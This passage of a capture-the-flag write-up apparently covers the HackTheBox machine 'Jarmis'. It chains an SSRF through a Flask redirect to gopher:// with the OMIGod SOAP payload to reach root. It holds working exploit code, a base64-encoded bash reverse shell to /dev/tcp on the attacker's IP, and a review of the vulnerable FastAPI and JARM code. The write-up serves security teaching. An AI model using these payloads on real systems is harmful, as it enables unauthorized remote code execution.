DATA = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
   <s:Header>
      <a:To>HTTP://192.168.1.1:5986/wsman/</a:To>
      <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
      <a:ReplyTo>
         <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
      </a:ReplyTo>
      <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
      <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
      <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
      <w:OperationTimeout>PT1M30S</w:OperationTimeout>
      <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
      <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
      <w:OptionSet s:mustUnderstand="true" />
      <w:SelectorSet>
         <w:Selector Name="__cimnamespace">root/scx</w:Selector>
      </w:SelectorSet>
   </s:Header>
   <s:Body>
      <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
         <p:command>{}</p:command>
         <p:timeout>0</p:timeout>
      </p:ExecuteShellCommand_INPUT>
   </s:Body>
</s:Envelope>
"""

```

There is a `{}` in the `<p:command>` tag which will be filled in with the `.format()` call above.

### Flask Server

#### Strategy

I’m going to create a webserver that can redirect the Jarmis request to try to exploit OMIGod. I’ve already solved the challenge of getting the request to my server (I did try to have it contact my server directly, but Flask / Python is not in the DB, and therefore it doesn’t make the 11th request).

The next challenge is getting a POST request via a SSRF. This is challenging. The User Agent above from the server was `curl`, which means it could be redirected to make Gopher requests.

I’ll need one of my redirection methods. I’ll use MSF (but `iptables` works just as well). I’ll set the MSF server to redirect to 8443:

```

msf6 auxiliary(server/jarmisRedirect) > set redirecturl https://10.10.14.6:8443
redirecturl => https://10.10.14.6:8443

```

I could actually have `redirecturl` be set the the Gopher url that I want to send, but I’d rather troubleshoot in Python, as that’s just easier for me, so I’ll have MSF (or `iptables`) redirect to Flask, and Flask redirect to localhost:5985. I’ll try to show the steps to building it, or you can grab the final version [here](/files/jarmis-flask.py).

#### Hello World

To start, I’ll create a simple Flask app that listened on 8443 with TLS and redirects to my box:

```

from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)    

@app.route('/')    
def root():    
    return redirect('http://10.10.14.6', code=301)

if __name__ == "__main__":    
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)

```

In the last line, `ssl_context` is what allows it to run with TLS. `host` is necessary else it would only listen on localhost. And I like `debug` because I can edit the code and not have to kill and restart the app.

When I send the scan from Jarmis, it works, redirected by MSF to Flask, and by Flask to `nc` listening:

```

oxdf@parrot$ nc -lnvp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:53838.
GET / HTTP/1.1
Host: 10.10.14.6
User-Agent: curl/7.74.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

```

#### Gopher

The next question is, can I redirect to a Gopher URL? I’ve shown this before in [Laser](/2020/12/19/htb-laser.html#apache-solr-exploit) and [Travel](/2020/09/12/htb-travel.html#interaction-with-memcache). Gopher is nice for this kind of thing because it has no headers. What you put in the URL is the body, so you can use it to write a HTTP POST request.

I’ll replace the location line in the server with:

```

    return redirect(f'gopher://10.10.14.6:5985/_test', code=301)

```

On submitting my URL to Jarmis, the redirects lead to this connection:

```

oxdf@parrot$ nc -lnvp 5985
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::5985
Ncat: Listening on 0.0.0.0:5985
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:47660.
test

```

It worked! There’s one trick to notice here that is important. If I run that again and save the result to a file:

```

oxdf@parrot$ nc -lnvp 5985 | tee test
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::5985
Ncat: Listening on 0.0.0.0:5985
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:42184.
test
^C

```

Looking at that file, there’s a `0x0d0a` or `\r\n` on the end:

```

oxdf@parrot$ xxd test 
00000000: 7465 7374 0d0a                           test..

```

This is important because it means I need to add two bytes to the content length or it will be off, which will break things (this took a bunch of troubleshooting to figure out).

#### OMIGod POC

To get the OMIGod POC into this, I’ll grab the `DATA` variable from the POC, replacing the command with `{}` to fill in later. I’ll also create a template for a `REQUEST`, with content length and body to populate later (and the `DATA` template truncated here with a `...[snip]...` for readability):

```

DATA = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" 
...[snip]...
xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">    
         <p:command>{}</p:command>    
         <p:timeout>0</p:timeout>    
      </p:ExecuteShellCommand_INPUT>    
   </s:Body>    
</s:Envelope>    
"""    
    
REQUEST = """POST / HTTP/1.1\r
Host: localhost:5985\r
User-Agent: curl/7.74.0\r
Content-Length: {length}\r
Content-Type: application/soap+xml;charset=UTF-8\r
\r
{body}"""    

```

The HTTP headers need to have `\r\n` for each line, but Python on Linux only treats newlines as `\n`, so I need to add the `\r`.

Now I’ll update the route to pass the new redirect:

```

@app.route('/')    
def root():    
    cmd = "ping -c 1 10.10.14.6"    
    data = DATA.format(cmd)
    req = REQUEST.format(length=len(data)+2, body=data)
    enc_req = quote(req, safe='')
    return redirect(f'gopher://127.0.0.1:5985/_{enc_req}', code=301)

```

`quote` will URL-encode the string.

I’m still redirecting to myself so I can see what it looks like, and it looks good:

```

oxdf@parrot$ nc -lnvp 5985
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::5985
Ncat: Listening on 0.0.0.0:5985
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:47688.
POST / HTTP/1.1
Host: localhost:5985
User-Agent: curl/7.74.0
Content-Length: 1663
Content-Type: application/soap+xml;charset=UTF-8

<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
...[snip]...
      <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
         <p:command>ping -c 1 10.10.14.6</p:command>
         <p:timeout>0</p:timeout>
      </p:ExecuteShellCommand_INPUT>
   </s:Body>
</s:Envelope>

```

### Remote

#### Ping

Instead of having it send the request to me, I’ll target 5985 on Jarmis:

```

    return redirect(f'gopher://127.0.0.1:5985/_{enc_req}', code=301)

```

After saving, I’ll send it again. It hits MSF:

```

[*] Redirecting client 10.10.11.117 to https://10.10.14.6:8443

```

Then Flask:

```
10.10.11.117 - - [23/Sep/2021 12:05:30] "GET / HTTP/1.1" 301 -

```

And finally I see `ping` at `tcpdump`:

```

oxdf@parrot$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:05:30.903265 IP 10.10.11.117 > 10.10.14.6: ICMP echo request, id 5, seq 1, length 64
12:05:30.903286 IP 10.10.14.6 > 10.10.11.117: ICMP echo reply, id 5, seq 1, length 64

```

#### Shell

To avoid worrying about special characters, I’ll just encode a shell:

```

oxdf@parrot$ echo 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1' | base64 
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0NDQgMD4mMQo=

```

Now I’ll update the payload in Flask:

```

cmd = "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0NDQgMD4mMQo='|base64 -d|bash"

```

On sending, I get a connection back with a shell:

```

oxdf@parrot$ nc -lnvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:45574.
bash: cannot set terminal process group (32938): Inappropriate ioctl for device
bash: no job control in this shell
root@Jarmis:/var/opt/microsoft/scx/tmp#

```

From there I can grab both `user.txt` and `root.txt`.

## Beyond Root

### Webserver Setup

#### NGINX Config

The webserver is NGINX. Looking at `/etc/nginx/sites-enabled/default`, it’s single server proxying various paths:

```

server {
        listen 80 default_server;
        listen [::]:80 default_server;

        root /var/www/html;

        index index.html;

        server_name _;
        
        location / {                                
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ =404;
        }

        location /api/ {                            
                proxy_pass http://127.0.0.1:8001/api/;
        }                                           

        location /docs {                            
                proxy_pass http://127.0.0.1:8001/docs;
        }                                           
        location /redoc {                           
                proxy_pass http://127.0.0.1:8001/redoc;
        }                                           
        location /openapi.json {
                proxy_pass http://127.0.0.1:8001/openapi.json;
        }   
}

```

It’s trying to load static files from `/var/www/html` and passing along four paths to the server on TCP 8001.

#### uvicorn

TCP 8001 is a Python server:

```

root@Jarmis:~# netstat -tnlp | grep 8001
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      14262/python3

```

That’s running with `uvicorn`:

```

root@Jarmis:~# ps auxww | grep 14262
htb        14262  0.5  0.5  26424 20992 ?        Ss   14:47   0:00 /usr/bin/python3 /usr/local/bin/uvicorn --reload --host 127.0.0.1 --port 8001 app.main:app

```

That’s actually started by a service through `systemd`:

```

root@Jarmis:~# pstree -gs 14262
systemd(1)───uvicorn(14262)─┬─python3(14262)
                            └─python3(14262)

```

The service is defined in `/etc/systemd/system/uvicorn.service`:

```

Description=Uvicorn systemd service.
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=/opt/app/run.sh
User=htb
Group=htb
RuntimeDirectory=/var/run/uvicorn
WorkingDirectory=/opt/app
ExecReload=/bin/kill -s HUP $MAINPID
KillMode=mixed
TimeoutStopSec=5
PrivateTmp=true
RestartSec=1
Restart=always

[Install]
WantedBy=multi-user.target

```

It runs `/opt/app/run.sh`:

```

#!/bin/sh

export APP_MODULE=${APP_MODULE-app.main:app}
export HOST=${HOST:-127.0.0.1}
export PORT=${PORT:-8001}

exec uvicorn --reload --host $HOST --port $PORT "$APP_MODULE"

```

This runs `app.main:app`, which is the `app` object or item from `main.py` in the `app` directory.

### Code Review

#### General

I’m not going into the entire API code, but it’s built on [FastAPI](https://fastapi.tiangolo.com/). `uvicorn` is calling the `app` object. This is defined as:

```

app = FastAPI(title="Jarmis API", description=description, openapi_url="/openapi.json")

```

There’s also a `api_router` object that is created:

```

api_router = APIRouter()

```

Then routes are created using this object as a decorator, and afterwards they are included into `app`:

```

app.include_router(api_router)

```

The `fetch` route is defined as:

```

@api_router.get("/api/v1/fetch", status_code=200, response_model=Union[FetchJarm2, FetchJarm1])
def fetch_jarm(*, endpoint: str ):
    """
    Query an endpoint to retrieve its JARM and grab metadata if malicious.
    """
    try:
        endpoint = json.loads(request.json())['endpoint']
    except:
        None
    if '//' not in endpoint:
        endpoint = 'https://' + endpoint
    o = urlparse(endpoint)
    resp = {}
    resp = json.loads(get_jarm(o.netloc))
    results = filter(lambda jarm: resp['sig'] == jarm["sig"], JARMS)
    for result in results:
        if result['ismalicious'] == '1':
            try:
                resp['note'] = result['note'] + '?'
                resp['server'], resp['ismalicious'] = get_header(o.netloc + o.path)
                if resp['ismalicious']:
                    resp['note'] = result['note']

            except Exception as e:
                print(str(e))
                resp['server'] = ""
                resp['ismalicious'] = 0
    return resp

```

#### 11th Request

When the results come back (each generated by 10 TLS requests), it loops over them, and for each checks if it `ismalicious`. If so, there’s a call to `get_header(o.netloc + o.path)`. This is what generates 11th request that I observed above, the one I’ll exploit.

`get_header` is imported at the top of the file:

```

from app.lib.getheader import get_header

```

The function actually does a bit of messy stuff to allow for a redirect from `https://` to `gopher://`, as `requests` won’t do that natively (and why it fakes like it’s `curl`):

```

def get_header(url):
    malicious = 0
    s = requests.Session()
    s.mount("gopher:", GopherAdapter())
    bad_headers = [ "gophish", "Apache" ]
    s.headers.update({ 'User-Agent': 'curl/7.74.0' })
    resp = s.get('https://' + url, verify=False)
    assert resp.status_code == 200
    try:
        for i in bad_headers:
            if i in str(resp.headers):
                malicious = 1
        return resp.headers['server'], malicious
    except:
        return "", 0

```

But the short version is that it takes the location and makes a GET request.

#### Gopher

The `fetch` endpoint is meant to take an IP, domain, or URL and use it to collect a JARM signature. This shouldn’t require a protocol or any kind of path on the server. If `http://` (or even `ftp://` or `gopher://`) is given, the site should either replace that with `https://` or return a failure. The site is coded to be rather forgiving, and it just checks if `//` is in the endpoint, and if not, it adds `https://` to the start.

```

    if '//' not in endpoint:
        endpoint = 'https://' + endpoint

```

It’s this forgiving that allows attackers to exploit the SSRF with `gopher://`.

#### 127.0.0.1 != localhost

I don’t see anywhere in the code above where the `endpoint` field is set. My best guess then is that it’s set by this line:

```

resp = json.loads(get_jarm(o.netloc))

```

`get_jarm` is imported at the top of the code:

```

from app.lib.jarm import get_jarm

```

Because this app is running with `uvicorn`, it’s not easy to just add `pdb` statements and debug. Still, I can play with `get_jarm` on my own. I’ll start a Python terminal and import `urlparse` and `get_jarm` (note that I’m running from `/opt/app` so the relative imports work):

```

root@Jarmis:/opt/app# python3
Python 3.8.10 (default, Jun  2 2021, 10:49:15)
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from urllib.parse import urlparse
>>> from app.lib.jarm import get_jarm

```

`urlparse([input]).netloc` is what is passed to `get_jarm`. That’s just the hostname and port:

```

>>> urlparse('https://localhost:21').netloc
'localhost:21'
>>> urlparse('gopher://localhost:21').netloc
'localhost:21'
>>> urlparse('http://127.0.0.1:21').netloc
'127.0.0.1:21'

```

When I try localhost on TCP 21 (which is closed), it gives errors and then returns a JSON string:

```

>>> get_jarm(urlparse('https://localhost:21').netloc)
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
'{"note": "localhost", "endpoint": "null", "sig": "00000000000000000000000000000000000000000000000000000000000000"}'

```

The same thing happens with 127.0.0.1, but it includes the `endpoint`:

```

>>> get_jarm(urlparse('https://127.0.0.1:21').netloc)
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
[Errno 111] Connection refused
'{"note": "127.0.0.1", "endpoint": "127.0.0.1:21", "sig": "00000000000000000000000000000000000000000000000000000000000000"}'

```

At this point I can safely say the issue is in the `get_jarm` function. As far as I can tell, this is pulled directly from [GitHub](https://github.com/salesforce/jarm/blob/master/jarm.py).

The returned JSON is built at the end of the function:

```

    result = jarm_hash(jarm)
    data = {}
    data['note'] = destination_host
    data['endpoint'] = "null"
    if ip != None:
        data['endpoint'] = f'{ip}:{destination_port}'
    data['sig'] = result
    return json.dumps(data)

```

So I need to find where the `ip` variable is set, which is the return from `send_packet`:

```

        server_hello, ip = send_packet(payload, destination_host, destination_port)

```

I’ve included that full function here, with line numbers:

```

256 def send_packet(packet, destination_host, destination_port):
257     try:
258         #Determine if the input is an IP or domain name
259         try:
260             if (type(ipaddress.ip_address(destination_host)) == ipaddress.IPv4Address) or (type(ipaddress.ip_address(destination_host)) == ipaddress.IPv6Address):
261                 raw_ip = True
262                 ip = (destination_host, destination_port)
263         except ValueError as e:
264                 ip = (None, None)
265                 raw_ip = False
266         #Connect the socket
267         if ":" in destination_host:
268             sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
269             #Timeout of 20 seconds
270             sock.settimeout(20)
271             sock.connect((destination_host, destination_port, 0, 0))
272         else:
273             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
274             #Timeout of 20 seconds
275             sock.settimeout(20)
276             sock.connect((destination_host, destination_port))
277         #Resolve IP if given a domain name
278         if raw_ip == False:
279             ip = sock.getpeername()
280         sock.sendall(packet)
281         #Receive server hello
282         data = sock.recv(1484)
283         #Close socket
284         sock.shutdown(socket.SHUT_RDWR)
285         sock.close()
286         return bytearray(data), ip[0]
287     #Timeout errors result in an empty hash
288     except socket.timeout as e:
289         sock.close()
290         return "TIMEOUT", ip[0]
291     except Exception as e:
292         print(str(e))
293         sock.close()
294         return None, ip[0]

```

If an IP is passed in as `destination_host`, it is set to `ip[0]` right at the top, and then that’s what comes back.

If a domain name is passed (like localhost), `ip` is set to `(None, None)`. Later in the code, at line 279, the IP is updated by `sock.getpeername()`, which does a DNS call for the domain and returns the IP. The bug here is that if the socket fails to connect at line 271 (or line 276), then it throws a `socket.timeout` exception, which is caught down at 288. It then returns “TIMEOUT” and `ip[0]`, which is still None.

That explains how it returns differently if the socket is open or not.